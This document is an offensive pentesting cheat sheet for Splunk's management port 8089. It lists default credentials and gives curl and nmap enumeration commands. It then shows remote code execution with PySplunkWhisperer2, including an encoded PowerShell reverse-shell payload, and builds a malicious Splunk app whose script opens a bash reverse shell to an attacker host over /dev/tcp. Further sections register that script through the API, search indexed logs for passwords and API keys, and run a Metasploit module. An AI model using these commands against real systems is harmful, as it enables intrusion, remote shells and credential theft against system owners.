# Port 8089 - Splunk

## Table of Contents
- [Enumeration](#enumeration)
- [Default Credentials](#default-credentials)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
curl -sk "https://$rhost:8089/services/server/info" --user admin:changeme
```

### Nmap

```shell
nmap -sV -sC -p 8089,8000 $rhost
```

### Port Reference

| Port | Service | Description |
| :--- | :--- | :--- |
| 8000 | Web Interface | Splunk Web UI |
| 8089 | Splunkd | Management API |
| 9997 | Forwarder | Data input port |

### Check Splunk

```shell
# Splunkd API (port 8089)
curl -k "https://$rhost:8089/services/server/info" --user admin:changeme

# Web interface (port 8000)
curl -k "https://$rhost:8000"
```

---

## Default Credentials

| Username | Password | Note |
| :--- | :--- | :--- |
| admin | changeme | Default admin |
| admin | admin | Common |

---

## Exploitation

### Splunk Universal Forwarder RCE

> Splunk UF runs as SYSTEM on Windows

```shell
# Using PySplunkWhisperer2
git clone https://github.com/cnotin/SplunkWhisperer2.git
cd SplunkWhisperer2/PySplunkWhisperer2

# Remote code execution
python PySplunkWhisperer2_remote.py \
  --host $rhost \
  --lhost $lhost \
  --username admin \
  --password changeme \
  --payload "whoami"

# Reverse shell
python PySplunkWhisperer2_remote.py \
  --host $rhost \
  --lhost $lhost \
  --username admin \
  --password changeme \
  --payload "powershell -e JABjAGw..."
```

### Malicious Splunk App

```shell
# Create malicious app structure
mkdir -p myapp/bin myapp/default

# Create inputs.conf
cat > myapp/default/inputs.conf << 'EOF'
[script://./bin/evil.sh]
disabled = 0
interval = 10
sourcetype = exploit
EOF

# Create reverse shell script
cat > myapp/bin/evil.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/$lhost/$lport 0>&1
EOF

chmod +x myapp/bin/evil.sh

# Package app
tar -cvzf myapp.tar.gz myapp/

# Upload via Splunk web or API
```

### API Exploitation

```shell
# Authentication
curl -k "https://$rhost:8089/services/auth/login" \
  -d "username=admin&password=changeme"

# Get session key from response, then:

# List apps
curl -k "https://$rhost:8089/services/apps/local" \
  -H "Authorization: Splunk $session_key"

# Run search
curl -k "https://$rhost:8089/services/search/jobs" \
  -H "Authorization: Splunk $session_key" \
  -d "search=search index=* | head 10"

# Execute script (if allowed)
curl -k "https://$rhost:8089/services/data/inputs/script" \
  -H "Authorization: Splunk $session_key" \
  -d "name=./bin/evil.sh&interval=10"
```

### Extract Data via Search

```shell
# Login to web UI (port 8000)
# Use Search & Reporting app

# Common searches
index=* password
index=* secret
index=* api_key
index=main source="*passwd*"
index=_internal source=*splunk*
```

---

## Metasploit

```shell
# Splunk Universal Forwarder Hijack
use exploit/multi/http/splunk_upload_app_exec
set RHOSTS $rhost
set USERNAME admin
set PASSWORD changeme
run
```

---

## Quick Reference

| Port | URL | Description |
| :--- | :--- | :--- |
| 8000 | `https://$rhost:8000` | Web UI |
| 8089 | `https://$rhost:8089/services` | API |

| Tool | Command |
| :--- | :--- |
| PySplunkWhisperer2 | `python PySplunkWhisperer2_remote.py --host $rhost --lhost $lhost --username admin --password changeme --payload "cmd"` |
| Metasploit | `use exploit/multi/http/splunk_upload_app_exec` |
